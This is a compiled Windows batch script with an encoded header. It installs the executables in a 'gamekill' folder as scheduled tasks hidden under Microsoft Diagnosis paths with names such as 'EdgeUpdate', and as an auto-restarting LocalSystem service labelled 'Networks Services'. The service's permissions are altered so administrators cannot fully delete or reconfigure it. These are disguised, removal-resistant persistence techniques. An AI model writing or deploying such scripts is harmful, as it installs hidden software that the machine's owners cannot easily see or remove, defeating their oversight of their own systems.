::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF65
::cxAkpRVqdFKZSTk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSTk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCqDJH2L91c9LRVAXziFPWa/DbwQ5G8zBG9dTXE8QfYwS5vayKDAJfgWig==
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
schtasks /create /tn "\Microsoft\Windows\Diagnosis\System" /tr "C:\gamekill\openstart.exe" /sc onlogon /rl highest /it /f
schtasks /create /tn "\Microsoft\Windows\Diagnosis\EdgeUpdate" /tr "C:\gamekill\appbigoff.exe" /sc onidle /i 6 /rl highest /it /f
sc create GamekillService binPath= "\"C:\gamekill\scstart.exe\"" start= auto obj= "LocalSystem" DisplayName= "Networks Services"
sc failure GamekillService reset= 0 actions= restart/0/restart/0
sc failureflag GamekillService 1
sc sdset GamekillService D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;CCLCSWRPWPDTLOCRRC;;;BA)(A;;CCLCSWRPWPDTLOCRRC;;;IU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Windows" /v NoInteractiveServices /t REG_DWORD /d 0 /f